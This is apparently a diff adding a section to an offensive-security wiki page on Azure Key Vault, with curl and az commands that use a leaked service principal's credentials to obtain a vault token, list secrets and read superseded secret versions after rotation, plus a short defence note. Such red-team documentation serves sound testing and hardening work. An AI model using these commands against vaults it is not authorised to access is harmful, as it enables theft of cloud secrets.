@@ -119,3 +119,35 @@ Access-policy vaults (`enableRbacAuthorization=false`) differ: there `Contributo
 management-plane control of a vault is one write away from its secrets. See [[azure-ad-iam]].
 
 <!-- promoted-slug: keyvault-rbac-owner-selfgrant -->
+
+## Rotated != removed: read a prior secret version (+ SP-cred REST data-plane access)
+
+Two deltas for a leaked service principal / managed identity holding `Key Vault Secrets User`
+(get/list), beyond the IMDS-token path already on this page.
+
+**1. Data-plane token from SP client-credentials over pure REST** (no IMDS, no `az` needed):
+
+```bash
+TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
+  -d grant_type=client_credentials -d client_id=<appid> \
+  --data-urlencode client_secret='<secret>' -d scope=https://vault.azure.net/.default \
+  | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
+curl -s "https://<vault>.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $TOKEN"
+```
+
+**2. Secret-version rollback.** Rotating a secret creates a NEW version but leaves the prior versions
+enabled and readable with the same `get` permission. If a current value looks like a decoy or a
+freshly rotated placeholder, pull the history: the real value is often the version just before it.
+
+```bash
+az keyvault secret list-versions --vault-name <vault> -n <name> -o table    # oldest .. newest
+az keyvault secret show --vault-name <vault> -n <name> --version <oldVersionId> --query value -o tsv
+# REST equivalent:
+curl -s "https://<vault>.vault.azure.net/secrets/<name>/versions?api-version=7.4" -H "Authorization: Bearer $TOKEN"
+curl -s "https://<vault>.vault.azure.net/secrets/<name>/<versionId>?api-version=7.4" -H "Authorization: Bearer $TOKEN"
+```
+
+Defence: on rotation, DISABLE or destroy the superseded version; `get` permission alone should not
+expose retired secret values. See [[azure-services-storage-blob]].
+
+<!-- promoted-slug: azure-keyvault-secret-version-rollback -->
